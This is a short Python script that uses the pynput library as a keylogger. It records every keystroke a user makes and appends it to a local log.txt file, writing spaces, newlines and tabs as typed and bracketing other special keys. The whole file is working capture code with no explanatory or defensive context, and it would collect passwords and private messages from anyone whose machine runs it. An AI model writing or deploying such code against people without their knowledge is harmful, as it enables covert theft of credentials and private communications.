from pynput.keyboard import Listener

def write_to_file(key):
    try:
        with open("log.txt", 'a') as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open("log.txt","a") as f:
            if key == key.space:
                f.write(" ")
            elif key == key.enter:
                f.write("\n")
            elif key == key.tab:
                f.write("\t")
            else:
                f.write(f"[{key}]")


with Listener(on_press=write_to_file) as listener:
    listener.join()